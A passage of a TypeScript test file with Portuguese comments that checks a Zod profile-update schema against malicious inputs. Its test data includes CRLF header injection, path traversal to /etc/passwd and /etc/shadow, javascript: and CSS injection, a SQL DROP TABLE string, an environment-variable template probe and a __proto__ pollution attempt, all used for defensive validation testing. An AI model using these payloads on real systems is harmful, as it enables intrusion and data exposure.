      // CORRIGIDO: file:// agora é bloqueado pelo regex DANGEROUS_PROTOCOLS
      // junto com javascript:, data: e vbscript:
      const result = updateProfileSchema.safeParse({
        resumeUrl: 'file:///etc/passwd',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URLs com traversal em coverPhotoUrl', () => {
      const result = updateProfileSchema.safeParse({
        coverPhotoUrl: '../../../../etc/shadow',
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA URL https válida no resumeUrl (controle positivo)', () => {
      const result = updateProfileSchema.safeParse({
        resumeUrl: 'https://example.com/resume.pdf',
      });
      expect(result.success).toBe(true);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 8: HEADER INJECTION (CRLF)
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-08: Header injection (CRLF) em campos de texto', () => {
    /**
     * TEORIA: Atacante injeta \r\n (CRLF) em campos que podem ser
     * refletidos em headers HTTP (ex: slug usado em redirects,
     * nome em headers customizados). CRLF permite injetar novos
     * headers ou até um body HTTP completo.
     *
     * MITIGAÇÃO: Zod slug regex [a-z0-9-] bloqueia CRLF no slug.
     * Outros campos (bio, displayName) são usados apenas no body JSON,
     * nunca em headers HTTP.
     */

    it('Zod REJEITA slug com CRLF injection', () => {
      const result = updateProfileSchema.safeParse({
        slug: 'valid-slug\r\nX-Injected: evil',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA slug com LF injection', () => {
      const result = updateProfileSchema.safeParse({
        slug: 'valid-slug\nSet-Cookie: admin=true',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA slug com null byte', () => {
      const result = updateProfileSchema.safeParse({
        slug: 'valid-slug\x00admin',
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA CRLF no bio — bio nunca é usado em headers HTTP', () => {
      // Bio é campo de texto livre — CRLF é aceito pois é usado apenas
      // no body JSON da resposta. Não há reflexão em headers.
      const result = updateProfileSchema.safeParse({
        bio: 'Linha 1\r\nX-Injected: evil\r\n\r\n<script>alert(1)</script>',
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA CRLF no displayName — sem reflexão em headers', () => {
      const result = updateProfileSchema.safeParse({
        displayName: 'Nome\r\nEvil-Header: value',
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA slug com caracteres especiais (proteção CRLF implícita)', () => {
      // A regex [a-z0-9-] do slug implicitamente bloqueia todos os
      // caracteres de controle, espaços, e pontuação especial
      const specialChars = ['%0d%0a', '\t', '\r', '\n', ' ', ':', ';', '=', '?', '&', '#'];
      for (const char of specialChars) {
        const result = updateProfileSchema.safeParse({
          slug: `test${char}slug`,
        });
        expect(result.success).toBe(false);
      }
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO BONUS: VALIDAÇÕES ADICIONAIS DE SEGURANÇA
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-09: Validações adicionais de segurança nos DTOs', () => {
    /**
     * Testes complementares para garantir robustez geral dos schemas
     * de validação contra inputs maliciosos diversos.
     */

    it('Zod REJEITA buttonColor com injection (não é hex)', () => {
      const result = updateProfileSchema.safeParse({
        buttonColor: '#000000;background:url(javascript:alert(1))',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA buttonColor sem # prefix', () => {
      const result = updateProfileSchema.safeParse({
        buttonColor: 'red; --evil: expression(alert(1))',
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA apenas cores hex válidas (#RRGGBB)', () => {
      const result = updateProfileSchema.safeParse({
        buttonColor: '#FF5733',
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA cardTheme fora do enum (injection no tema)', () => {
      const result = updateProfileSchema.safeParse({
        cardTheme: '<script>alert(1)</script>',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA linkStyle fora do enum', () => {
      const result = updateProfileSchema.safeParse({
        linkStyle: "'; DROP TABLE profiles; --",
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA linkAnimation fora do enum', () => {
      const result = updateProfileSchema.safeParse({
        linkAnimation: 'javascript:alert(1)',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA iconStyle fora do enum', () => {
      const result = updateProfileSchema.safeParse({
        iconStyle: '${process.env.DATABASE_URL}',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA backgroundType fora do enum', () => {
      const result = updateProfileSchema.safeParse({
        backgroundType: '../../../etc/passwd',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA photoPositionY fora do range 0-100', () => {
      const result = updateProfileSchema.safeParse({
        photoPositionY: -1,
      });
      expect(result.success).toBe(false);

      const result2 = updateProfileSchema.safeParse({
        photoPositionY: 101,
      });
      expect(result2.success).toBe(false);
    });

    it('Zod trata string vazia como undefined (não persiste lixo)', () => {
      const result = updateProfileSchema.safeParse({
        displayName: '   ', // whitespace-only
        bio: '',            // vazio
        slug: '',           // vazio
      });
      // emptyToUndefined converte para undefined → campos opcionais ficam ausentes
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.displayName).toBeUndefined();
        expect(result.data.bio).toBeUndefined();
        expect(result.data.slug).toBeUndefined();
      }
    });

    it('Zod NÃO propaga prototype pollution para o output', () => {
      // Tentativa de injetar __proto__ — Zod ignora campos não definidos no schema
      const result = updateProfileSchema.safeParse({
        __proto__: { isAdmin: true },
        bio: 'Bio normal',
      });
      // Zod aceita o payload mas não copia __proto__ para o output
      expect(result.success).toBe(true);
      if (result.success) {
        // __proto__ é uma propriedade especial do JS — verificar que
        // o campo isAdmin NÃO foi propagado para o resultado
        expect((result.data as any).isAdmin).toBeUndefined();
        // O output contém apenas campos definidos no schema
        expect(result.data.bio).toBe('Bio normal');
      }
    });
  });
});
